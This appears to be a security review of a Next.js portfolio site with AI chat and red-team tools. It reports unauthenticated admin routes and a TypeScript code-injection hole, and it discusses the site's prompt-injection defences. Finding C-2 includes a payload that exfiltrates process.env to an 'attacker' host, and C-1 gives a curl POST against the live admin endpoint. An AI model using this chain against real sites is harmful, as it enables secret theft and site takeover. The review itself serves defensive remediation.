# Security Review — paulfalor.com (Next.js 14 App Router + Vercel AI Gateway)

Reviewer: senior application security engineer (adversarial, read-only)
Date: 2026-06-21
Scope: all 8 API routes under `app/api`, the AI library (`lib/ai/*`, `lib/redteam-card.ts`),
the `/red-team` and admin client surfaces, `middleware.ts`, `next.config.js`, env handling.

---

## 1. Executive summary

The **public AI surface is well-built and not exploitable** in any way I could find. Inputs are
size-bounded, the pasted document is correctly wrapped as untrusted data, LLM output is rendered
through `react-markdown` v9 with no raw-HTML plugin (so no XSS), the OG route clamps every
attacker-controlled param, and no secrets leak to the client or into error messages. Prompt
injection against the advisor/red-team is contained (worst case is a model being talked into
off-script text, which has no security impact here).

The **admin surface is critically broken.** The two mutating admin endpoints
(`/api/admin/save`, `/api/admin/ai`) have **no server-side authentication at all**. The only
gate is a client-side React component (`AdminAuth.tsx`) that flips a `localStorage` boolean.
Anyone on the internet can POST directly to these routes. `/api/admin/save` then writes
attacker-controlled content into `lib/data.ts` and commits it to `main` via a stored GitHub
token, and the generator does **not** safely escape several fields, so an attacker can inject
arbitrary TypeScript into a file that Next.js imports and executes. That is remote code
execution on the build/server, plus arbitrary defacement and abuse of the GitHub token.

**Risk posture: Critical.** One reachable RCE/unauth-write chain; otherwise a clean, thoughtfully
hardened app.

Counts: **Critical 2, High 1, Medium 3, Low 4.**

**Single most important fix:** Put real server-side auth in front of every `/api/admin/*` route
(or delete the admin routes entirely, since CLAUDE.md says the UI is stale and edits happen
directly in `lib/data.ts`). Client-side `localStorage` auth is not auth.

---

## 2. Findings by severity

### CRITICAL

#### C-1. Mutating admin routes have no server-side authentication
- **Where:** `app/api/admin/save/route.ts:301` (POST), `app/api/admin/ai/route.ts:96` (POST).
  Auth is only enforced client-side in `app/admin/components/AdminAuth.tsx:16-22,35-37`
  (reads/sets `localStorage.admin_authenticated === 'true'`). There is no `middleware.ts`
  (confirmed: none exists) and neither route checks any credential, cookie, or header.
- **Exploit:** `curl -X POST https://paulfalor.com/api/admin/save -H 'content-type: application/json' -d '{...ResumeData...}'`.
  The browser auth screen is irrelevant; the API never validates anything. `/api/admin/auth`
  returns `{success:true}` but issues **no session token / cookie**, so even the "real" login
  grants nothing the route checks. The gate is decorative.
- **Impact:** Anyone can (a) invoke `/api/admin/save` to overwrite `lib/data.ts` and push a commit
  to `main` (defacement, and burns/abuses the privileged `GITHUB_TOKEN`), and (b) invoke
  `/api/admin/ai` to run arbitrary LLM completions on Paul's `OPENAI_API_KEY` /
  `ANTHROPIC_API_KEY` with **no rate limit** (direct cost-DoS and key abuse — see C-2 and M-1).
- **Remediation:** Enforce auth on the server. Minimum viable: an `httpOnly`, `Secure`,
  `SameSite=Strict` signed session cookie set by `/api/admin/auth` on success, verified at the
  top of every `/api/admin/*` handler (and ideally a `middleware.ts` matcher for `/api/admin/*`
  and `/admin`). Compare the password with a constant-time compare (see H-1). Given CLAUDE.md
  calls the admin UI stale and unsafe, the cleanest fix is to **delete the admin routes and the
  `/admin` page entirely.**

#### C-2. Arbitrary TypeScript / code injection via `/api/admin/save` (RCE on build/server)
- **Where:** `app/api/admin/save/route.ts:6-248` (`generateDataFile`), invoked at line 325, then
  committed to `lib/data.ts` on `main` at line 331. Reachable unauthenticated via C-1.
- **Root cause:** the generator string-builds a `.ts` source file from request JSON. String
  fields are only partially escaped (single quote / backtick), and several fields are **not
  escaped or are interpolated raw**:
  - Numeric fields written raw with no validation: `id: ${exp.id}` (63), `value: ${stat.value}`
    (51), `id: ${metric.id}` (90), `value: ${metric.value}` (91). A payload like
    `"value": "0); console.log(process.env); ([" ` (a non-number string) is emitted verbatim
    into executable TS.
  - String fields interpolated with **no quote escaping** (a single `'` breaks out of the
    literal): `type: '${cred.type}'` (39), `suffix: '${stat.suffix}'` / `prefix: '${stat.prefix}'`
    (50-51), `suffix: '${metric.suffix}'` / `prefix: '${metric.prefix}'` (92,94),
    `icon: '${area.icon}'` (112), `year: '${edu.year}'` (134), `gpa: '${edu.gpa}'` (136).
  - Even the quote-escaped fields only escape `'` (or backtick for the template-literal
    `summary`); they do not neutralize `${...}` inside the backtick-delimited `summary`
    (line 28), allowing template-literal expression injection.
- **Exploit:** POST a `ResumeData` body where, e.g., `stats[0].suffix` is
  `x'; await fetch('https://attacker/'+JSON.stringify(process.env)); const y='`. The committed
  `lib/data.ts` becomes valid TS that Next.js imports during build/SSR, so the injected code runs
  in the deployment with full access to `process.env` (every secret: `GITHUB_TOKEN`,
  `AI_GATEWAY_API_KEY`, `ANTHROPIC_API_KEY`, `ADMIN_PASSWORD`, etc.). This is RCE.
- **Impact:** Full server compromise / secret exfiltration, persistent backdoor committed to the
  repo, site takeover.
- **Remediation:** Fixing C-1 removes external reachability, but the generator is unsafe in
  principle. Do not hand-build source files from user input. If the admin save must stay, serialize
  data as **JSON** (e.g. write `lib/data.json` via `JSON.stringify` and import it) instead of
  emitting TypeScript; strictly validate the payload with a Zod schema (numbers are numbers,
  enums for `type`/`category`/`icon`, length caps) before writing. Never interpolate user input
  into code.

### HIGH

#### H-1. Timing-unsafe password comparison + no lockout on `/api/admin/auth`
- **Where:** `app/api/admin/auth/route.ts:15` (`password === adminPassword`).
- **Exploit:** `===` on secrets is not constant-time and the endpoint has **no rate limit and no
  lockout** (the `rateLimit` helper is not even imported here), enabling unlimited online
  brute-force of `ADMIN_PASSWORD`. Timing leakage is secondary; the missing throttle is the real
  problem. Also note that because of C-1 the auth route is moot, but if you fix C-1 by relying on
  this route, it must be hardened.
- **Impact:** Password brute-force; if `ADMIN_PASSWORD` is weak it falls quickly.
- **Remediation:** Use `crypto.timingSafeEqual` over hashed buffers, add per-IP rate limiting /
  exponential backoff to the auth route, and set a real signed session cookie on success.

### MEDIUM

#### M-1. `/api/admin/ai` has no rate limit (cost-DoS / key abuse)
- **Where:** `app/api/admin/ai/route.ts:96-138`. Calls OpenAI `gpt-4o` (line 45) or Anthropic
  Sonnet (line 78) directly on Paul's own API keys, with no `rateLimit()` call and (per C-1) no
  auth. `content` is unbounded — only presence is checked (line 101).
- **Exploit:** Loop POSTs with large `content` to run up the OpenAI/Anthropic bill on Paul's keys.
- **Impact:** Direct, uncapped financial loss and possible key throttling/suspension.
- **Remediation:** Delete the route (preferred) or gate it behind auth + rate limit + an input
  length cap, and route it through the Gateway (which has spend controls) like the other AI tools.

#### M-2. In-memory per-IP rate limit is bypassable across serverless instances
- **Where:** `lib/ai/ratelimit.ts:12` (module-level `Map`), used by `/api/ai/{redteam,chat,assess,brief}`.
- **Exploit:** Vercel fans requests across many warm lambda instances, each with its own empty
  `Map`, so effective throughput is `MAX_PER_WINDOW × instanceCount`. The key is also
  `x-forwarded-for`'s first hop, which a direct attacker can spoof (Vercel does set a trusted
  client IP, but the code reads the raw header). An attacker rotating the `x-forwarded-for` value
  resets the window every request.
- **Impact:** Cost-DoS against the Gateway / model spend; the limiter blunts casual abuse only.
- **Remediation:** Treat the in-memory limiter as defense-in-depth only and rely on the Vercel AI
  Gateway's authoritative spend/rate limits (the code comment already acknowledges this — make sure
  Gateway limits are actually configured). For a real limit, use a shared store (Upstash/Vercel KV)
  keyed on the platform-provided client IP, not the raw header.

#### M-3. Internal error messages forwarded to clients on admin routes
- **Where:** `app/api/admin/save/route.ts:339-340` and `app/api/admin/ai/route.ts:135-136` return
  `error instanceof Error ? error.message : ...` to the caller. The save route's message can
  include GitHub API responses (e.g. token-scope or repo errors), and the ai route forwards raw
  OpenAI/Anthropic error text.
- **Impact:** Information disclosure (internal config, provider error detail). Low-to-medium given
  these routes should be removed/locked anyway.
- **Remediation:** Return a generic message; log detail server-side only. (The public AI routes
  already do this correctly — see C-2 contrast.)

### LOW

#### L-1. No security headers configured
- **Where:** `next.config.js` (only `reactStrictMode`). No `headers()` block; no CSP, HSTS,
  `X-Content-Type-Options`, `Referrer-Policy`, or frame protection.
- **Impact:** Defense-in-depth gap. A CSP would also have mitigated any future XSS in the markdown
  surface. Low because no current injection sink is exploitable.
- **Remediation:** Add a `headers()` block with a strict CSP (the site has no inline-script need
  beyond Next's runtime), `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`,
  `Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`.

#### L-2. No CSRF protection on state-changing endpoints
- **Where:** `/api/admin/save`, `/api/admin/ai`. Once C-1 is fixed with a cookie-based session,
  these become CSRF-able (JSON POST, no origin/token check).
- **Remediation:** Use `SameSite=Strict` cookies and verify `Origin`/`Sec-Fetch-Site`, or a CSRF
  token. (Bearer-token auth instead of cookies sidesteps this.)

#### L-3. PII regex guardrail is advisory and easily evaded
- **Where:** `lib/ai/guardrails.ts:40-50`. The credit-card pattern `(?:\d[ -]?){13,16}` also matches
  any 13-16 digit run (false positives); spaced-out or worded PII evades all patterns.
- **Impact:** Minimal — the PII check is purely a UX nudge ("we spotted PII"); nothing security-
  critical depends on it, and the document is never stored or logged (verified). Noting only so it
  is not mistaken for a control.
- **Remediation:** Keep as advisory; do not let any enforcement decision rely on it.

#### L-4. Injection-detection regexes are bypassable (acknowledged, non-load-bearing)
- **Where:** `lib/ai/guardrails.ts:18-25`. Trivially evaded (synonyms, encoding, languages,
  whitespace tricks). This is **correct by design**: the routes treat `detectInjection` as
  informational only (`app/api/ai/redteam/route.ts:35-36` comment; the chat route uses it only to
  populate the transparency/defense panel). The real defense is the untrusted-data prompt wrapping.
  No action required beyond not making it authoritative.

---

## 3. Component-by-component notes

**`/api/ai/redteam` + `lib/ai/redteam.ts` — solid.** Document validated as a string with a 40-char
floor (`redteam.ts:48-57`), truncated to 12k chars (`:14-20`), wrapped in `<document>` tags with a
strong, explicit "treat as DATA, never instructions" system prompt (`:59-73`). Output is a
Zod-validated `generateObject`, scores re-clamped server-side (`:82`). Worst case of a successful
injection is the model emitting attacker-chosen text in the gaps/verdict, which is then rendered as
plain React text (no HTML) — no XSS, no privilege gain. Errors are generic (`route.ts:48-52`). Not
exploitable.

**`/api/ai/chat` + `lib/ai/advisor.ts` — solid.** 1000-char message cap (`chat/route.ts:36`),
history capped to last 6 turns (`advisor.ts:88,155`), grounded system prompt with scope + anti-
injection rules, citations filtered to a known allowlist (`advisor.ts:78`). LLM markdown rendered
via `react-markdown` v9 with `remark-gfm` only and **no `rehype-raw`** (verified), so HTML in model
output is escaped — no XSS in `AskPaul.tsx:219`. Generic error responses. Prompt-injection cannot
reach any secret or tool (there are no tools/function-calls wired to side effects). Not exploitable.

**`/api/ai/assess` + `/api/ai/brief` + `lib/ai/tools.ts` — solid.** `assess` strictly validates the
answers array (length + 1-4 range, `assess/route.ts:24`). `brief` length-clamps `role`/`industry`
(120) and `concern` (300) (`brief/route.ts:24-26`). Both rate-limited and route through the
Gateway. Brief markdown rendered safely (`ExecBriefingGenerator.tsx:58`, no rehype-raw). Note these
now use Sonnet/Opus (`tools.ts:15-16`), so M-2's cost-DoS exposure is higher-value here than on the
Haiku chat path — worth confirming Gateway spend caps.

**`/api/og/redteam` + `lib/redteam-card.ts` — solid.** Every param is decoded and clamped:
`band` validated against an allowlist (`redteam-card.ts:26`), `score` coerced and clamped 0-100
(`:26`), `verdict` sliced to 160 chars (`:27`), at most 3 `gap`s each sliced to 90 chars (`:28`).
Satori (`next/og`) renders to a raster image and does not execute scripts, and all values land in
text nodes. No unbounded string reaches the renderer, so no edge-route memory/CPU blowup from giant
params. `runtime = 'edge'`; image response, no caching of sensitive data. Not exploitable.

**Admin routes — critical (see C-1, C-2, H-1, M-1, M-3).** This is the entire risk of the app.

**Client (`RedTeamClient.tsx`, `AskPaul.tsx`, `ExecBriefingGenerator.tsx`) — solid.** No
`dangerouslySetInnerHTML` anywhere (verified by grep). User and LLM content rendered as React text
or via the safe markdown renderer. `cardHref` builds the OG URL via `encodeCardParams`
(`RedTeamClient.tsx:61-69`), which URL-encodes and clamps — no injection. The download link uses
`rel="noreferrer"` and `target="_blank"`.

**Secrets / env handling — clean.** No secret is referenced in any client component (all
`process.env` reads are in server route handlers, verified). No `NEXT_PUBLIC_*` secret. `.env*`
files are gitignored; only `.env.local.example` (placeholder values) is committed. No hardcoded
keys in the tree or recent history.

---

## 4. Hardening recommendations (defense-in-depth)

1. Add security headers / CSP in `next.config.js` (L-1).
2. Move rate limiting to a shared store keyed on the trusted platform client IP, and confirm Vercel
   AI Gateway spend/rate caps are configured as the authoritative backstop (M-2).
3. Cap document/input sizes at the edge (Vercel body-size limit / WAF) in addition to in-handler
   checks.
4. Consider Vercel WAF / Attack Mode for the AI routes given they call paid models.
5. Strip `x-powered-by` and avoid echoing model identity in responses if you prefer not to disclose
   which models back the features (currently disclosed by design in the transparency panel — fine,
   just a choice).
6. Rotate any API key that has ever been exposed, and scope `GITHUB_TOKEN` to the single repo with
   minimal `contents:write` (per MEMORY.md there is already an open item to rotate the key).

## 5. What is solid / well-built

- The public AI design is genuinely good: untrusted-data wrapping with an explicit "never obey the
  document" instruction, structured `generateObject` output, server-side re-clamping of scores,
  citation allowlisting, history caps, input length caps, generic error messages, and safe markdown
  rendering with no raw-HTML path. I found **no exploitable vulnerability** in any public AI route,
  the OG image route, the card encode/decode, or the client rendering.
- Secret hygiene is clean: server-only env reads, nothing in `NEXT_PUBLIC_*`, `.env` gitignored, no
  keys in history.
- The guardrail regexes are correctly treated as informational/UX, not as load-bearing security
  controls, and the code comments say so.

The only thing standing between this site and a clean bill of health is the admin surface. Lock it
down (or delete it) and the deployable risk drops to Low.
